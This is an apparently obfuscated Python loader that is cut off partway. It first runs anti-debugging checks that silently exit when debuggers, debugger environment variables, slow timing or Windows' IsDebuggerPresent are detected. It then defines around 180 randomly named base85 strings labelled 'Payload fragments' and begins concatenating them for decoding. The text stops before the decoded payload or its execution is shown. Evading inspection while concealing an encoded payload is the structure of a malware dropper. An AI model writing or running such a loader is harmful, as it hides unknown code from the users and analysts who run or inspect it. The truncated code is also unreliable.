#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_ceQlnc6doB2GQi = '4qUW#F~owtanhhK{u$=^RhhDBvYWcmhu~dUpte0)jG$ufe@Ua>CT}rW=?F='
_c_fi8vIZefJkq2 = 'O{WDTshz_5@VqJC;N2Tb;A?dy_?L56(Gx&`Qc6MkG*Xz6KHaPVyVIB^&I3b'
_cmEAusattH_TNG = '#?3UZ2H-Lf{_A1RW|eeS=gll?V`AH<p@4878RgUMM0oag#-C5hYJeI2IYnm'
_cxLZnf1lgnEpqZ = '(^oHP}P=iXMby$ZCmE0ljK4Mi2~&0we$-RS1w%#RE5coQBrJ@My)kQXpVOY'
_cdm81nmiMR0YF4 = 'eL`eS^RlIh*qEX%w@1X^b`69)=px1L_Qb5g8$B>m*rTb6I3-kapR#0g;W14'
_cz1E6NIz_UI42_ = 'r^0+iX{T@5mToc&2dyeN?4BVp$77aBDx0qg+;cVx-m}EK>#4S}zEi35R&*8'
_cj0skIvilRYn8M = 'JYzue}ECd{^ggDiG{fOYG%~`u)rDjD-Fx(4GJ>Mcqmo9}x(DEr+Fi8I1Nc='
_ctcCubpsehKJF9 = 'Yd;O=qtN}czp2v*SvHobapB&BPN5hh(QctF*QOmu1N9Oe{)?1w1J_fC8_0<'
_cfziOwu3kuU6LP = '5HKPkiPy+T~)lw`thp_2RC;mwj_U(Pgxkp1GgHnxiuOphR~RdMg*sui5PA%'
_ccPWrGhusSxhKy = 'IrTgoZ;7e3m*n}vBE}S!Ywu%N>e(F53>h$LB1o^R5Q8FxXU|tW)VpW$Cva7'
_cxlZvtBBkmuRlq = 'y2kdJ=&lh^^tsj0f1@9D9eJ)d3t2T&yVQ~01kI2+auLg}l3m|lQ_~Frlug}'
_cqJ1CIWnWlQ8v4 = 'O=<p>&ai+=b_4}nB=2hLr^$SZ=qNoMb-VdQ^zNDRk&!*@cpztw&J|j9p+OE'
_cfykTXt6VAhN0M = 'Tg-BoX`EX;#*F!B{*4z)DpJlT(jKK2cBrK)*+IB)IP1H;D4$eN9$ZU~Om2)'
_ctuxJB2XcW5x1w = '|%U#}P^St81L0Ljz3V{h!HdzA!2w<bi0zfWReCzdm(}&dQCVsh;t>;~_WO)'
_chPUL1oWBsqbVy = 'V)x8bQ`>e1J5`0DG9{t6D^Tc8BvaFojC=VO+Q`I&t)Hjp{_Kg{zL!K)oyaz'
_cbS381wKdWr2wr = 'OqETRG~NxHSs`!zlh+uh0B(=tE!Zh5>V|`xu&&MsCenxDX(QT_Kgac*mh(X'
_cnt643XFl4ALRV = 'KuE2LKU0Y(aIQ&1(U{Yd%1X)_j{2`g*RiQYC#hR{M4(ecIFpWM=h1R+JCG8'
_chzk2YE33HbG6V = 'M2;}yV53VXZzfNF09`bCYIIuU2a4V6#?2&xnB0#f8RZj3-0KvX1=*J5v2&C'
_cpQHcSKcnUNz3u = 'v*Ex_=}&^ah%|;@S-2{<SDyxoY2?C?NqoT&8dbLn9TbR^|EyfgwTmzk4<Zw'
_cowzZV4cDf1znn = ')rJVLc4DGx^fT%X`s23pZd+Yspw-5Eve6+K0Rbfo(VP3Hy$<M4pjVVkZw;P'
_coiOX7fujgKGtL = 'tQTVKBq5raz>`e{@lMh2rk)1Qh{AQ=f091hlRh~o6T>CgSy_61^qZo3wjOF'
_cjVMQPQ6VM9Jpc = '06jT_IKSvI}AK*wEGeEr6E4x!HMrg;;5NgSNCzi=$1d%uVilrYwjLMzj?)`'
_cqTeLZ4wfuziIq = 'b_;M=4R^_js%zX~<a>tfoT0w?e{xOYt!uMBeeY7}xWP#|nIZ`t-jRqzvl^b'
_c_OrXeMp5IQYti = '&NS{V%(x-5e}DHY;WAB%EiCsrC^j`UO;`TIcnjXP0IIPF8zz|H`U5$I*D%?'
_ckX2xKuwBJH_Hl = 'COGu#t9eCVo*0?DmXA--k&y+3<~`N0~9(+gMx!$KZL<zN^j*kyCtqNIv4Ky'
_c_baDJBqouPPWc = 'Pn2oz&9|YwG>ASxO>fgMicg9w>N$LsJCdS?=bNr2!q^0}ro%h;4|SE5&82='
_clG4e8FRm57lcO = 'BgmP7!Dz8D0_|U}iQ9dRZ2FLX^1IR)1Fxz9)`j~&Bu~nBC@6~3XLfqkh?l}'
_cfwY0rW2NLebzr = 'scW#~xp_3&00`VH#*os6dmhNrnYsjGDA8awTAO1vW|JQf}2tnI!W_0(C9nn'
_cbVZsgAlvB2Kzv = '`17s)I+Z_U2i*@^x5hz($YJAB#R8LP)~?fMc0V({MKlEb$&Op5S=mY@cHn#'
_coeFmHS9pi8AiF = 'GLpGI6O?>JeANuOT_L6i0yTK%bNJ#ffKsdYcFNGrwX;KDR}a5HNL6OdCVnb'
_cfqPAVFG2NGu_R = 's&t%ph9=`VF{YK*{d|*ko<;F8vA@y25g&URxEiNA-0KiW$Tn5DHPW{4Vn=>'
_cwij0vLC1iUZ6u = ';p{!PXR&@bb`zjaVs{jwn_J0CIr0F9v*5~4IXz>9Je{Qn=a>f5eW5kkXG}o'
_cepCwCzaKNSNiX = 'Ld;GlwOH)Eeli6uGWavbi8Xixq4o?I#J>N@ncD#&sVF4nVQ&xYXX-P5&rf&'
_cwaeyPeuA2slrK = 'uTTVwvPH*1j&gRc1f|wT^yzD$L<fMNL%EvlRB~1UaN0pBM}k)$yBc-3SxM&'
_csVxmeENERu5Lw = 'mA(<Bzh_2KbsU)|2q?{B~i5M?N&#|+#ZVe5YT;ncD=~$vi!Dzu(xf`$$g(1'
_c_3nbJCh2IZOdA = 'dkT-lz1RF<c8S*dF|?QRys~lDTTO<KSS^lM&8*I!Es2qANFOm7!j@ju$4`e'
_cq9rLsm4BbUk9L = 'oiP{{Rrk>J?!Ql@k?9grrFN~g^GsM*@D&Qt2hNKEb;btnKa4~Ugd!1$D!?$'
_cw2S9l26Q3jRMg = '1*n7gFef<Q|Q;wFS9glgT~*9q+I9Oqa4>ZG=*+{w(A8faAVBX!FDs{#QROk'
_cfLSMrXQlotO8X = '>iQ)S2@A>3zGe!IM#o1F~kxti$qBLq23SSrqtqRD)6-u8uH-6y>f|aWjUrT'
_cuM8ZENpQszLWu = 'S~yJbl4|flr&|Jkp~X>#n6?g2f9F{zHp!ej=*X3Vh3VWF@Pa}8kh9qWPHJK'
_cj950LowKOohhj = '0S0L96WCEOI~ObAkI_IyDKgT!9v??{)L6DhRa_LW{<Yx^zT%QqYeZt~CrQ;'
_cwySCdV4M44lCk = '~s>VutKw^p6A%ZWKORH+54NMznmi^#jfDWY<_}kyEQXMyJ`)a*)qm5{(N_E'
_ccBUVZ09lmZrA2 = 'ri7K)dVI5COAoF_-LDJarqJW3i9I23^>*og1Di5#`y;mVYH!<BMzYq~$<t>'
_cixAoeseKRfMrL = 'X;f7G;d)GP<SZV+M%p7tSx}RE;Z0_&LxBfQJAR2|9-N&VAj(`<id2siz$67'
_cw_hNpA_5bzbnX = 'xXXCqNWiF^dqSZp5f!a%C+TjMCLL@8JWlri}OgSXEPe_Tx`Fyt&CG!0^Gu;'
_cx7jDKAwvGgTtC = '*vbv=0t?RPESUH_KhK+$D_j?T0Le@%N*o#M+<Vpf(i?}?nH;%Mx~R1?bt4*'
_cdE0daeFLI5lNZ = 'j0RZ=r2*z$`&_c;6Qvgcmh<+MXo}1n!X1#YlkwmbOUdU4g#3YN06)xP;16q'
_cp610zcLFy_IBq = 'a+N3cH^9>N%6nSEl}$bf?<CdU_{0q=JXaxsZ}wru(EwHnO;AAzDKgZ_AG)&'
_cm1UXN9glaStYU = 'RZ1;1T8Nj7QJmMT!}lK&fSD9qn0_ZIOxTj=rT<v>$S)(D0nY?a{7$OfBzqn'
_csR8vxT2WhLrNU = 'iaUfbwHSiKU!v{onrZXC*ivsbar>I@Y*u-x_8Yvv?duvxmTv8MKvwg+s^I;'
_cbwuw51eTjY1Hj = '>WDv>`HuTX3X?`(YlNUiy4u2rJDShTS*=<}$bP^Oh`qD`g}9skR7}9RGH{s'
_ccQMuapKj5zrhY = 'b)YXDyiSosy+*eicxKJDk8MA*f=|F0oHEOP{alL=oe*Bz7Cb=+xD2bh+0^N'
_cgZOz2b4rbJ1SO = 'LP*R!F1>1|0U-`gVmOb{VArX6_ha0QFy@dPtn9IQH5V@A$5=IhdHA-Q*fWJ'
_cfuTN1tHI6ORk9 = 'TC3dY2h&4rkJ_>u2~MXAtJ^ZT*A6ruwpu)>8#ViI&T0*U3jeMc)~sh>50QQ'
_cp_U33WsqRcYRP = 'EJ%BTeG(uAf*nM^TZ{CPkgu{2j%g;H|t4g%fhAsC>+tQz-dPgC}I-0iM_my'
_cjpds4eIkQ8E7K = '8g|sdQ-MDHqWlbD2Te>!F0jyiAXi}>UfO$4nW-matkYs`vda^KuEucPP|fv'
_cxE8SSyRppLDdE = 'ie#g%z0GkCE_e`^fqJtO^Vu-mz?H9KRn}_YT3~1JN#<s9Dvc?QjD{UWh=>Z'
_c_htvxr6JjqJvR = '#Za3`0xxK)`?%92KUm4E0|Afaa|dBy&FAhdb-(4wS%m>;+Sclza@ZIU-h=g'
_ch5LFm1nOnxC0k = 'XdIcti2Vhz1^#<*~q86Xt%o5dH!B173ONYKVg*Ttxn+X@km_bL&r`h_7J|R'
_czmSgLYLVrUI08 = '{A{aE%U@YTi!F$qHInT%i=zCOTa+978sfAa-CK&t|FzLaS_sa{RX3ABO{aO'
_caigQHO2uHWXSJ = '-vA1dxAl72uo|BcttDm+o@GJD{)Y9#ESvUHQHrgw>j_yr5eFcR7vgBQnYj8'
_cj3Kovqhu0rTml = '!iZ&)47tL1@gCci;?DGUN?d+Riaex2rmwuQ3V{9<b0fMc4;8x3#h~Fr0O*{'
_cdxda59hCZ2Q4T = 'Z)6O|i)=)Tp&s(zK3{<#jfo$>#>U(VT_ME-aVzrtThqwTkhF)H%Uvdt#5^5'
_cp_ZeW6JSnOiNe = '2Wa2?I>(ck&1O;8sS4TKYk6KzYD5&;sxFBP3oXqUCX&xJWoEN(o;-F{)ukM'
_clbgzYyMeFVjav = 'ZL`M4{<xxZSTFMq2*DG6uWHdvOgAcdno&iBN^995UDY8Lr+QdLVE}X(luWx'
_chnPznFhaU3f5Q = 'cH}{eAgq&$jIe39VvsK_E{=!XTQ&KsF3zQE>T+M-Ch!9dV*2BRBD^m^W!M7'
_cjlWzKKmaSJ4r6 = 'j;>2W&nR!jnozK9tXxP2ED<6fmBn5X%Kr$a9xoJAO1OJdCL?u^H-Ad#jf&d'
_cq_yp4Vb8ImRwF = 'k%5k>8`O!gDLaE<8!n>O8PgS3Y!Ul)L#uzGxj!Ob}0J=+SQOMI=CT0sod@T'
_cnp6G04dc1CI8D = 'PkY#i}C|#|;dtI%%bG7+IK>Fnt!3fI@d*fLr0)@i<}xFISCO=!T98u6WR;w'
_chn0YJNWxrdnni = 'tm2MUWXsne{-4=FC-&idX&hKHK?U2jhFt*8%q6{0t~7vDY+{CV_AjK(81v`'
_cuiwNZcOVCQFdn = '<Fqa9O)BtWO~M46$6s2ySi+@epAIDVA|kp)5i4%mng?zVcRz%*dO@dP{uI5'
_c_OphAyRRKjeWo = 'g9sR5OZ`k4}CmdnS&9ajzA^e1G+FB9lIq(1Mm8ve;=NbfO4bGn)0?XoN9Y#'
_cj9RlIM__XmyTS = 'pxIziX+_`?=h9iPj;$xn7rR0!v_oH}%+JMkn`kAj`2cW+%tSBqCNErwU$cr'
_cn7Hh2jbCdcJ79 = '0W(Zg;i>FiG_nKygstq6=3aS`QWjii%`iHi4lX3;+W<{cT(zrJ*pJHUO*v('
_cdgXnaYWghp6MO = '(KJOhw&eQ7G)lmWLA((QFu*ymhlh<62M2z)g<}UxKaxZW2u-<BBw~Q6?M+d'
_caeLjZr63ls5Da = 'Nw-Q^iFM;pIBW!|?zwaDkR2D~Er(!5D@g*rFwXo*K0vnT%pcmF$9lo^)ul;'
_cpSPxTYUqmq1zG = 'ShmwCNep#0EaB_>@Z6vR@hF)=c*;s?777<DxqisC&yjR*#?MZX<+8AAa0b4'
_cqWh9RCflYeHPr = '8IiKK^6FZEtlmf7`AM^>x-nne2vpK6>hJ@9Z4q<N0R{f>C>N4mMul4m4fU@'
_cw8JEV9Dan5bD7 = 'b<7nf}qKUmTKp+a>vTub6O23(!CQ$0PJDrMI}YSWn9H`Ttu*Qg4{L#~2Guu'
_cykKsnjQKDhrWk = 'g~b+)cMHh^pydfbmYnzdFxB0umyrI2T_APp2Wkp>EA(WCqWdj-Gy5MX&j3`'
_cqCFWDri8FVcd4 = 'IFRgX*dv`uV>`%I1ayGnnNSfv0B~z2FD!&0SopL^1yK)am(JV5?V|Af1F4o'
_ca5oi5UbnS3epU = '>O^*=|TklKs5r!o|<{TcjMR+^IfhNZ89LuNcdq-al5-jD<&ukudt&QBlFT5'
_cxcgGUJvreueST = '_zYM0E<U$ek65A3L<^klQCKqdMivTlLKP6U{PNi;#qgnIK8UMrOg&%dhDab'
_crjX7qRpPq3BXt = 'EAR*O(d9a^{v`Utg@E&o-Y~hUqxNZ+7AoR!>O6YD)*ivHf#G77_>Uv3JmGp'
_cxM4MVAopAnyIh = 'S%P+W8)5d?0>Wh3`>9{0L^~j<Q(>@G!$N>R#4}7nV9QOCa~OI&&iOi>@yj~'
_c_50dzlmOiM4_a = 'mQh8kHNix+e>+G~b(>`m+)^iD8W2aSgdda;FwDcC&+^QNkEUs6i9hCM3sRZ'
_c_WG5PlnZaqOXE = 'yqk5Bf^IkmQl~==$6J=0c>yHl8UV!~KwIip!&~$VyowXiPP>kX<YNO_A@~L'
_cpkiJ57CWUIHa4 = ')I?o1y>ER_(eWNKuz`o6LqP+>V4LaIvUVDgNRa)O%B4Cd=+7BB$)&fZFHCb'
_cuSw9yXD5n1IaP = 'lInad#D^1T1>%gBv<Io7FL=R>UQ)2&(p?#=h+Nq4>M~2d32rh(lMa2n_E1x'
_cvFwKQUyaNS2Ub = 'S@?mO+!l-7-i8_`+-sw0OFyXCO7y6*)6sS=VZ+!GtBu|uz;YCV~N^BYRsdi'
_ck1BRWQEyl10ME = '{+l-GIItcJArekT)8&zGWf_By_S=$&@X7%K{g52xscI%|0iv?=rGZw>bJ58'
_cvWNmZG6PnNx4q = ')o_)^j9{~eW)>ZLLqP~ils@Cg7=Nx`qaR5uiLHNW;nBlwxR^t(!ngAlg^+C'
_cklcnzDp7BC8Fo = '7fprl<t)3-b?=p%^FN+S*6d3bLwanuKE*|wNvF3TNTSHkJ2YUl&aj7{PIq1'
_ct9W13uKvQ9oTk = '`8`)nE$!qm-LxL(nEf!kZ<wmCH*gltFK#T018gk)wxCVfv~K@Zp93)!UY3l'
_cqNjAdVaBgJCOm = '-+uHY5DCyQ#t{c3$7@ELReiQy@`_&jCX^G^Ptss2V93p(huLSQLflo>jr3E'
_cw4pcU0tfZspln = '2?J(gZ_t4FQfF92SYC7yt20<hNUx}WO?fFT=84I0+~1xfg{j}TN{AoiTde>'
_c_XAAvIkWMqnS5 = 'jCv$Xy%ZAF~D2`?;9F!@9IA+6iX(5i)44g^Z$YJ&5n5+d7<L|X7Svi1I&6?'
_cjTOc7n9tx35CE = ';A_C-Snx_cXy+REt+M~TzbXl4Ut&dknb5*&GoK&Rv;gV#Fs3y6ZGJKlJ-P>'
_ceuwZIlv7SnTy_ = 'q&9J^;{VRix)pI-qRicd^mWqfAQk$H*@#Co2<CYqqk8AId_mUA!qEHImli2'
_cpQGdCMe4tMHUk = '8-R<Qjpt_4VlU0cWXKHzUpl{uGqQ9N?qpTQd6oG{{CaUx@#)&8iywg89pLm'
_c_JyrLMocmQmVr = 'n&zyLdr}n-w^kVSVxino1h0NLW-9ANsjFq?S80!G#Z4%G3NAvxLsWut{dCK'
_csFjE1O_bwtOyL = '&>wP$F1js{Ph-!BwWnI88W)E;lU?uWRqQ(TvQL>*d>qMP{LdFmTTyndP3qZ'
_ch1BVQJ212KHfF = '<1jTvOtI0K8g32hsWZ$&rh;F{K}0B452PVZ5tA+7p{#vg?w&Tjp^+V>enT%'
_coro8lGXqIliPb = '@JC{_@WcsBZrDg6QLzH5V_UFn}j(=vmGgpb|n37ab%Tgj#wN!{+dXg5T?*-'
_coiQKGnML7Io1w = 'GL?Qlv@xsh-j9s6bT+TrL;*;_TL%MiBHbnCcW1q(s3b#C7WjN77A;sokiwP'
_cjv505lSXA266l = 'O>ka;6cCg#TrF)@gpW5CK5IOM?V5CcX_c0HKHSO)evyGM2kC!QA``YDG9vM'
_czv1DWmFaEXaEG = '~7PPQA(^2;*ZcSvjuq?wlk*c{RqH4K$)Wv1)MAm2O<lr3X-6p6~k;_fpYZ4'
_cggFiZuRNcWVR6 = 'etnf5zwmS%a!lM+-lHZ<gAR@z#P0ODcm6enh<Yn<_RZ_m<aaxhNX0!QFTh}'
_chWEXdCyZm4f1s = 'qG?_03JeG(2YtpH;3jQxf!lN+7aQYu{ucyVM(bAJZQkDhg-9-pJGD>@ulD_'
_cziIqtuAJ2DbkM = 'd|bR<!bdj%X`h>!7<%X#$k<IcRocRaYvLT@G%ghm^==E09J{Qb8?Gv7sF|b'
_cobB8p3UCD4Qu4 = '=Dcyhcd|5%G7~66@XPBr?j>-$VUJLb3K-$Huw7zNXShIao+BTBA`=Ai*kR>'
_crKOpDYN_fBJkZ = 'lIsi^(EVh#H8q2ThPRGfg(pwOy!i&^fN#()}r+81Z{}I3z7iA!f%zhmMx^W'
_c_nLbI3nbtbXQl = '!ECuE9xBC|HIhT<G(x~x0~t02(lf)`4)+3L)Q;DWC*%k;LzOSZ&i|Eg_Tf3'
_cks5hJBbQMCuAd = '9C`1VP(rfAjx=yR&TV%@|lBKipdq%85P%Hq2dEz&s4H1u0GhybBHG4R+7x<'
_cer57k2FbWvZXM = 'hl$bh$_Xh|34<#o7D>M_7%Dnlw;2(!Dc$DLAGOJI6>D!w)|u(=Y6DZJCMPf'
_caCZ4hmCoFMW_c = '!}!a>QcvGri!r9k6PUJYl|x(2=E=rUcPPu82stM)0#EQriX*PZeX(7j_0_E'
_cs1GWeufEqxc3K = 'zQDd_&d-z(?s*IDHs`KapU{Y%qVOim8xYIhR+TTMEWgOF7Q8QP1W$cryfz7'
_cgxN_iX7eeUUeX = 'T1mL7g07#Hn&J-YAE%+MVUhDUe`Ki%Hd%j}aJowa4(vIegY|68Z$_5A4_I4'
_cdqVKi4axIOBoa = 'Gah{9!A|&pFPu`&LXT-mj|SjOJLbeeK<<ID)dl)tGiEP-7Clr-zL@9;O&%O'
_cs0n6M0Ktg3POH = 'iK#Waw=5vx>ka}wIfVq^7+(!Ad-6QWUy<SG;`|5K1U5qzWH?oCalIVcb?F{'
_cmTKqWGV5ddD4R = 'mGMwk%Lq?=wV?ydcg(2KYbbI8b&Wmgm>^r&UzS>X0J=C6Qa!}Jh6qJlLe@I'
_cfiNT71MWOTXV9 = 'M+s`D!W@87kWky+JX&+0w8OH(<M8PJH`?Acp?pvTZ#9VP?EaifFk~i<F5&A'
_cpIugqKiGKwldj = ')7Zh$PoIPijbPn=mmPLK>Eb^R%$ZL$#E^4l1Df%{Xs)0Vd^!@{7mSn6)8fv'
_cyohQ4P6XA7GA5 = 'V7dFM1Q|x<l#0g(P8iya65OP}b0qs7--(*PW1w1H%QaHsn02`r+Jmb?7^Ik'
_cmxP9KY3Pd5Vvy = '<_w0-LhE)00>koG-F~zRi<+@?rf<%i4N!0`q;NWzkrc5l%ebiK!<RCNvLG2'
_cgR4DhpysYfIib = '1#}5+F>vc)5wKo8Yd}uF(rj@x`z97xN31z9SI?V*jI$&`4vOW!?0~GZDBP-'
_cvG5ffSklPdfZx = 'ZOzNBZKj!j3=T-W}g8PusX-;D|D5KR<(%LWOK|d(RmO;g#6@1So*B7}?@sL'
_c_rdBPAx6VFX8l = 'ZYBV23F7c^;SrriKV`9?PKkVvh;F?K<$op^t8T)%YIyX%MlU<ch!@Gv+H(d'
_cxckwRDBADUwJ9 = 'TY5sN?7(QI^hAO#KR$R9yI<cfWQlY5+Ekua&Habgy+)5i-5fTve1|M(pkx8'
_cugkMo3y4V6exS = 'b``7B=ln(LgveEG_TQ8EZIN`$st8bEa=IGdBymRAD=QoqBq`fivY`VcR6Te'
_cmQEbi6p8zPZTT = 'tfgh)&ULcDhdxC9$9UC)!i$i|!BI#nU1(;kC2@v)Ws|ARA$#BMGmvYJ&=_J'
_ctSbobHcnlgIoP = 'z*iGhu$=^sgkOY79m<tRvwQl!dgXSi0@+0n-UncMbk8V|%8d0xH&yRP1B+A'
_ciGSJDh76deplL = 'XXR>fp4hKHL4QIF_Im;SbQsj1dx{0>PrcBb%XglqzS_|>vO)gTiUhKpV@Sw'
_cgb3pJUCninhHm = '^iG-Px9BJh!YQt+2jBKWD`QTUbRRW;1RxQ$f5X6)8pwX>L5^ytA=qS)jrMd'
_cj67Uz4il7Xwif = 'Z33~zK7Cr#9J@*h7JN7&ZqnlNOB5ci)r+V)g^HS1ZiqrcfL*pF{}d46>jW9'
_ckp8zrKNfuwNJ7 = '&Lwj4*?gPn=pidVzE!@ou`{T;faqCm12rMX7X4LrY&;Tm5E94g)ca{|?$5e'
_cpd0HT1sYWNyCR = 'jMDIAC_skNq#`Q3wEM3*j$>JBQLkc#$7<KC?20S)NcgPa@k$f(IBnN7YN+s'
_ctcwcz0nq02nb8 = 'UE9s%>S(TrJWDV-a3L4t>kV_6o2mtvTE#vt&|7{S~gH(|othfXeE30A+tj}'
_cw5HfJhxQhQZgk = 'IzpX9^cU@Lgxab_@4|-`B6jOI)J|9@>A@VLV_`@lfBo?CI<Lx1$GMax1%h='
_cp9SKE3FkdbC99 = 'oZ^ZijOZ~6i3Hx4`ws`AFEaAx&6U0;1HF^`U3)y=g7xrtM!UZ^_EQmhJI0r'
_c_lSW0ltJTBlCH = 'H+1vRl!I_rjjUnk2x-R&8E=Hjxn^s@{F#+*LHdlaE2RZY%90<r{HO7S!ivd'
_ceLYcaO6tTCy08 = 'vv~%%eomsj=tNXc5lHU|=oU4lgUWxIZbuOocMRKa9N)rv(307?3X2*rH<j`'
_caVQAjJwnR7wKX = 'ayX{XgC?7)!4kr3XR1H+>28pb%#bX2s48cZLYD-Qjq1gKRBIjOEUn<y_pHm'
_cvYqn6Ny40W5xk = '>`*kYJRiZ?rt_?KR?d3|E+2{}d*Z9pa<}rjqZGv0ILbj~VU*N#Hq8%6c_$3'
_ctUOPqTBeqy2NY = '$^nYluE|1WH^Ke@Ut6nhpCSk^`!FV546<^<qSqprw&|%XAQ7e0fhPB-?5#0'
_cymZGPrrXpEiB3 = 'RA98T*N@8lF!d6nwJwyBt48A4QQ?Msu8_s>f~_X{H<z-Y@&6e4;3bIM*9;L'
_cnxqucD27C_zIL = '))`!z{?VLrDP<2t3^>{fP^0tV#<$zKLA|ft#bnbR*SzI?YaXh2xv2&V-H}<'
_cadh1aWsyD0X6A = 'rS!jWJU9xwzZn-Z``Cz}kwL5gqNy7>yn8oN3X-m$J=z>5VgOnD>d<h^l4H#'
_cuVAnuX1Jaf2rS = 'B7_r1xlVs9h2gjm2I?4#(0D>+*o-`C9ee=<I$PrC+{L#A<DC-?MPm@sm50t'
_cxwInQOt2wQHEk = 'x4$K)^z}UNUE`B$o~EA_<3X4ImK=yzXXg29rM83_b^tyRebCJ;lI&KdQNyV'
_cojaMBIGx0l6jY = 'o!1v{mII(Yij>v3qW^7JVcvGWkf+(6K7?K*cyUGLem@Ov!5{c7_-m9$FFj6'
_czUxbQ7eueK3qk = 'r8zesf^IMc35(aI9;3^oCH`NU9BK19g<I8T%+P*#r3H%VOMW66tG-Q`g31j'
_cwbE4xHF4gdmAB = 'rxzy1mRTs6)Hc?a@XII%$;UIG+0<)*~Ewhb&7gS8}ScM-X;Z^KbXT&2qn>;'
_cdR7gs1O8TVHzN = 'Sw2We{5S)Y1;!+ul@WBrl~}hgN?zxkBIWV5<BLEDl>dFq?JX%-Odm_jQ(p-'
_cwfNKM2lzi9aCL = 'Ebi7Sf_x-fVZraMq~I3%@#O^8Oh8m!rv`p*ieo6+WxTA9m%;*b<FS(fTEw4'
_ckRApkvSGYTvIy = 'S-eeW7tM5`GsuuIB+3Fc>{6}KPc(3XGu_;CJS@CWtj`dO#5P!=-X4>@RJ`z'
_cvmMZolq6HB0cC = 'u{f`jHo;ewovQZ1xOeV#%Ck;yrOc^qZRkMq)et4#Hn0v-`xmhi|jC1e}zBD'
_cfv7DNZT5pFTBU = '*Mc9usaN7w-<Hl&DS84Os3g+_lqjK_Ox+>%cOwweJv(Lij~)?*ofho>IN!z'
_ct9OR4Yv5iIa5Z = 'ub^Px9dc8a}{a{sh~I26U1E`<c4+J<nf7ZJGRtZT}cF%<_M>59fQHCudx#Q'
_cf4g6PqTcAO8WE = 'YB)UL0cCF)U%RPG2AKZy6;V*{GU^MREC<J9jmWih473f;=8_gjQ05<o>fny'
_cqM9HimSDnnxpX = '-e@cz&EOE%j~vYWV$jd2Bt#S{Y{s6>7tncSf<(p|WgG%dR7@bE95pZMwxbJ'
_cwtfd2dJKM1kOw = '5ejRDtI#pSpA8)n2iQHBkLueT3DSIW5M&{$UL+&S&e{MPJ*=fofr2kfrg)|'
_ceoTSFf1zGnv7H = 'dJJ~fMy(H5XYKOL&vhkg@6eKg~7)IV(&MB5mm82I~b$9sIyhIt4oWj4dZ{p'
_ci3smVLlTUB53l = 'n>yTkgdHUr(c{>JiRx;K*8XGiHdRVd2s)0~i%<H6bB+Qqj6sZcCKS0sa8!-'
_ccd4qN6X66XJ7n = '*qa@3`!uxy?%JZ@gR>hd-<rZPwU&fk!u~NW_2jyvybn}8M<uKKm-IcE9VKo'
_ccikkv5TnKHPej = '!o)A-k&j4zv_HxCe9V{*N_d_n_w0<X-BoBRkjP#f|Jta+@-*VrA5#8iQx3h'
_cbAEvFf1EPQSYe = 'zOB+umObQDg-0@fh{R{)Dz8$3bD*FXMO$lUu7$&D$C9IF%Qn!t_r%&EDL&B'
_cjLdzcZTsteB9Y = 'HHrL0_8262zsb2V-<;CL8`#}NlGgZy^T=SO7mPpC}5xv8X&<96IKr~bFd&?'
_coWdiaKwIzmsaL = 'H5dPYL0jsj=RF9`j*I9+0!pm}*DitxtSO+ir;oeMDj>?~_B%Zc6H&3l0P=d'
_ckm9bsMCWcxAUb = 'w8~U?jYF<6`2;@E}I$)7LSDCi#W^TYoIaGP$nxD$Xnq^{e79fic83HSdWWk'
_crKQCq7UANeQWO = 'P4Xq6-v_s*2v#DVFx2)6)=vG*c`m~Up=k'

_piRc0n3q53dHdw = __import__('base64').b85decode(_ceQlnc6doB2GQi + _c_fi8vIZefJkq2 + _cmEAusattH_TNG + _cxLZnf1lgnEpqZ + _cdm81nmiMR0YF4 + _cz1E6NIz_UI42_ + _cj0skIvilRYn8M + _ctcCubpsehKJF9 + _cfziOwu3kuU6LP + _ccPWrGhusSxhKy + _cxlZvtBBkmuRlq + _cqJ1CIWnWlQ8v4 + _cfykTXt6VAhN0M + _ctuxJB2XcW5x1w + _chPUL1oWBsqbVy + _cbS381wKdWr2wr + _cnt643XFl4ALRV + _chzk2YE33HbG6V + _cpQHcSKcnUNz3u + _cowzZV4cDf1znn + _coiOX7fujgKGtL + _cjVMQPQ6VM9Jpc + _cqTeLZ4wfuziIq + _c_OrXeMp5IQYti + _ckX2xKuwBJH_Hl + _c_baDJBqouPPWc + _clG4e8FRm57lcO + _cfwY0rW2NLebzr + _cbVZsgAlvB2Kzv + _coeFmHS9pi8AiF + _cfqPAVFG2NGu_R + _cwij0vLC1iUZ6u + _cepCwCzaKNSNiX + _cwaeyPeuA2slrK + _csVxmeENERu5Lw + _c_3nbJCh2IZOdA + _cq9rLsm4BbUk9L + _cw2S9l26Q3jRMg + _cfLSMrXQlotO8X + _cuM8ZENpQszLWu + _cj950LowKOohhj + _cwySCdV4M44lCk + _ccBUVZ09lmZrA2 + _cixAoeseKRfMrL + _cw_hNpA_5bzbnX + _cx7jDKAwvGgTtC + _cdE0daeFLI5lNZ + _cp610zcLFy_IBq + _cm1UXN9glaStYU + _csR8vxT2WhLrNU + _cbwuw51eTjY1Hj + _ccQMuapKj5zrhY + _cgZOz2b4rbJ1SO + _cfuTN1tHI6ORk9 + _cp_U33WsqRcYRP + _cjpds4eIkQ8E7K + _cxE8SSyRppLDdE + _c_htvxr6JjqJvR + _ch5LFm1nOnxC0k + _czmSgLYLVrUI08 + _caigQHO2uHWXSJ + _cj3Kovqhu0rTml + _cdxda59hCZ2Q4T + _cp_ZeW6JSnOiNe + _clbgzYyMeFVjav + _chnPznFhaU3f5Q + _cjlWzKKmaSJ4r6 + _cq_yp4Vb8ImRwF + _cnp6G04dc1CI8D + _chn0YJNWxrdnni + _cuiwNZcOVCQFdn + 